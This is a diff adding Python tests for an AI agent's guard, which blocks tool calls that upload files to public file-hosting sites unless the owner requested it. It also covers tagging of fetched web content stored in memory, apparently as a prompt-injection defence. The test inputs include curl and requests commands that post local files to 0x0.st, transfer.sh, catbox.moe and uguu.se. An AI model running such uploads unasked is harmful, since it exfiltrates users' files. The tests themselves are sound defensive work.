@@ -354,3 +354,25 @@ def test_main_loop_memory_marked(monkeypatch):
         [("web_fetch", {"url": "https://shop"}), ("save_memory", {"section": "s", "content": page})],
         {"web_fetch": page})
     assert executed[1][1]["content"].startswith(U.MEMORY_TAG)
+
+
+# ── [2026-10-22] 公网文件站/图床上传闸: 始终生效, 不依赖是否中了注入 ─────────────────
+def test_public_upload_gate_blocks_without_owner_request():
+    g = _guard("用 comfyui 画一只橘猫给我看")
+    assert not g.tainted
+    for fn, args in [
+        ("execute_shell", {"command": "curl -F 'file=@/tmp/cat.png' https://0x0.st"}),
+        ("execute_shell", {"command": "curl -s -F files[]=@cat.png https://uguu.se/upload"}),
+        ("ssh_exec", {"host": "qi4070", "command": "curl --upload-file cat.png https://transfer.sh/cat.png"}),
+        ("write_file", {"path": "/tmp/up.py", "content": "import requests\nrequests.post('https://catbox.moe/user/api.php', files={'f': open('a','rb')})"}),
+    ]:
+        msg = g.check(fn, args)
+        assert msg and "公网文件站" in msg and "本地完整路径" in msg, (fn, args)
+
+
+def test_public_upload_gate_allows_download_and_owner_request():
+    g = _guard("帮我画一只猫")
+    assert g.check("execute_shell", {"command": "curl -sL -o a.png https://i.imgur.com/abc.png"}) is None   # 只是下载
+    assert g.check("execute_shell", {"command": "curl -F 'file=@x' https://example.com/api"}) is None      # 不是公网文件站
+    g2 = _guard("把这张图上传到图床, 给我一个外链")
+    assert g2.check("execute_shell", {"command": "curl -F 'file=@/tmp/cat.png' https://0x0.st"}) is None
